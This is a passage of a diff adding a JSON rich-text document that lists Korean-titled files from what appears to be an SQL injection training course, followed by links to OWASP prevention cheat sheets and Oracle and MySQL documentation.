+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "4"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차-1-Blind-login-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "5"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차-2-join-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "6"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차-3-날짜-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "7"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "3일차-1-SQLi-6-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "참고 문서"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "OWASP SQL Injection Prevention",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "OWASP Password Storage",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Oracle Database ROWNUM",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/ROWNUM-Pseudocolumn.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Oracle Database ALL_TABLES",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Oracle Database TO_DATE",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/TO_DATE.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "MySQL USER function",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://dev.mysql.com/doc/refman/8.4/en/information-functions.html#function_user"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
